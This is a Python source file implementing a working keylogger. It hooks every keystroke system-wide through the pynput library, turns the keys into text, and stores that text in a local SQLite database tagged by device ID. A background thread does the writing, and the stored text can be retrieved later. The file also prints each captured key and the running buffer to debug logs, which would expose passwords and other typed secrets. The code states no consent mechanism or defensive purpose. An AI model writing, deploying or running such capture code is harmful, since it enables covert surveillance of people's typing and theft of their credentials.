from abc import ABC, abstractmethod
import threading
import time
from datetime import datetime
import logging
import sqlite3
from pynput import keyboard

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self, device_id: str) -> str:
        """Start the keylogger"""
        pass

    @abstractmethod
    def stop_logging(self) -> str:
        """Stop the keylogger"""
        pass

    @abstractmethod
    def get_logged_keys(self) -> list[str]:
        """Return collected keystrokes"""
        pass

class KeyLogger(IKeyLogger):
    def __init__(self, db_path):
        self.db_path = db_path
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.running = False
        self.device_id = None
        self.listener = None
        self.writer_thread = None
        self.last_write = time.time()
        
        # Initialize DB
        self.init_db()

    def init_db(self):
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS keystrokes
                        (id INTEGER PRIMARY KEY AUTOINCREMENT,
                         device_id TEXT NOT NULL,
                         timestamp TEXT NOT NULL,
                         content TEXT NOT NULL)''')
            conn.commit()
            conn.close()
            logger.debug("Database initialized successfully")
        except Exception as e:
            logger.error(f"Error initializing database: {e}")
            raise

    def on_press(self, key):
        try:
            if not self.running:
                return

            # Convert key to character
            if hasattr(key, 'char'):
                char = key.char
            elif key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.enter:
                char = '\n'
            elif key == keyboard.Key.tab:
                char = '\t'
            else:
                char = f'[{str(key)}]'

            if char:
                with self.buffer_lock:
                    self.key_buffer.append(char)
                    logger.debug(f"Key pressed: {char}")
                    logger.debug(f"Current buffer: {''.join(self.key_buffer)}")

        except Exception as e:
            logger.error(f"Error in on_press: {e}")

    def write_to_db(self):
        while self.running:
            time.sleep(15)  # Buffer write interval
            current_time = time.time()
            with self.buffer_lock:
                if self.key_buffer and (current_time - self.last_write >= 2.0 or len(self.key_buffer) > 100):
                    try:
                        content = ''.join(self.key_buffer)
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
                        
                        if content.strip():
                            logger.debug(f"Attempting to write to DB: {content}")
                            conn = sqlite3.connect(self.db_path)
                            c = conn.cursor()
                            c.execute("INSERT INTO keystrokes (device_id, timestamp, content) VALUES (?, ?, ?)",
                                    (self.device_id, timestamp, content))
                            conn.commit()
                            conn.close()
                            
                            logger.debug(f"Successfully wrote to DB: {timestamp} - {content}")
                        
                        self.key_buffer.clear()
                        self.last_write = current_time
                    except Exception as e:
                        logger.error(f"Error writing to DB: {e}")

    def start_logging(self, device_id: str) -> str:
        if self.running:
            return "Keylogger is already running"

        try:
            self.device_id = device_id
            self.running = True
            
            # Start keyboard listener
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            # Start writer thread
            self.writer_thread = threading.Thread(target=self.write_to_db)
            self.writer_thread.daemon = True
            self.writer_thread.start()
            
            logger.debug(f"Started logging for device {device_id}")
            return "Keylogger started successfully"
                
        except Exception as e:
            self.running = False
            logger.error(f"Error starting keylogger: {e}")
            return f"Error starting keylogger: {str(e)}"

    def stop_logging(self) -> str:
        if not self.running:
            return "Keylogger is not running"

        try:
            self.running = False
            if self.listener:
                self.listener.stop()
            
            # Force write any remaining buffer
            with self.buffer_lock:
                if self.key_buffer:
                    content = ''.join(self.key_buffer)
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
                    conn = sqlite3.connect(self.db_path)
                    c = conn.cursor()
                    c.execute("INSERT INTO keystrokes (device_id, timestamp, content) VALUES (?, ?, ?)",
                            (self.device_id, timestamp, content))
                    conn.commit()
                    conn.close()
                    self.key_buffer.clear()
                    
            return "Keylogger stopped successfully"
        except Exception as e:
            logger.error(f"Error stopping keylogger: {e}")
            return f"Error stopping keylogger: {str(e)}"

    def get_logged_keys(self) -> list[str]:
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("SELECT content FROM keystrokes WHERE device_id = ? ORDER BY timestamp DESC", 
                     (self.device_id,))
            rows = c.fetchall()
            conn.close()
            return [row[0] for row in rows]
        except Exception as e:
            logger.error(f"Error getting logged keys: {e}")
            return []

if __name__ == "__main__":
    # Test path for database
    path = "keylogger.db"
    keylogger = KeyLogger(path)
    print(keylogger.start_logging("Device-1")) 